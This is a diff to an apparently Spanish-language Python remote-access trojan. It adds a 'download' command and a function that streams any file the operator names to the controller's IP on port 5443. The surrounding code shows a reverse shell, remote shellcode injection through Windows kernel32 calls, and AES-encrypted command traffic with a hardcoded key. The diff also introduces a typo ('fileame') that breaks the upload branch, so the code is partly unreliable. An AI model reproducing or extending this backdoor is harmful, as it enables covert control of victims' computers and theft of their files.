@@ -148,7 +148,23 @@ def hack(code):
      
     ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 
-#Receive Data Method
+#Sent File Method
+def sent(ip, aes, fileName):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, int(5443)))
+    f = open(fileName,'rb')
+    print f
+    print 'Sending...'
+    l = f.read(1024)
+    while (l):
+        print 'Sending...'
+        s.send(l)
+        l = f.read(1024)
+    f.close()
+    print "Done Sending"
+    s.close()
+    
+#Receive File Method
 def receive(aes, fileName):
     # Create a TCP/IP socket
     sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -175,7 +191,7 @@ def receive(aes, fileName):
 
 def shell(ip, port):
     #CipherAES Object
-    aes = AESCipher( 'mysecretpassword') #16 Characs
+    aes = AESCipher( 'yibEejptfvGvuidg') #50 Characs
     #Code to set hack mode
     code = "0"
     #Base64 encoded reverse shell
@@ -195,11 +211,20 @@ def shell(ip, port):
                 response = "¿Cual es el nombre que quiere que tenga en el destino (indique ext): "           
                 encoded = encodeCipher(aes, response)
                 s.send(encoded)
-                filename = decodeCipher(aes, s.recv(4096)) #Receive filename
+                fileame = decodeCipher(aes, s.recv(4096)) #Receive filename
                 print filename
                 encoded = encodeCipher(aes, 'OK')
                 s.send(encoded)
                 receive(aes, filename)
+            elif cmd == 'download':
+                response = "¿Cual es la ruta del fichero?: "           
+                encoded = encodeCipher(aes, response)
+                s.send(encoded)
+                filename = decodeCipher(aes, s.recv(4096)) #Receive filename
+                print filename
+                encoded = encodeCipher(aes, 'OK')
+                s.send(encoded)
+                sent(s.getpeername()[0], aes, filename)
             elif cmd == "hack":
                 response = "Se ha habilitado la ejecucion de ShellCode remoto"            
                 encoded = encodeCipher(aes, response)
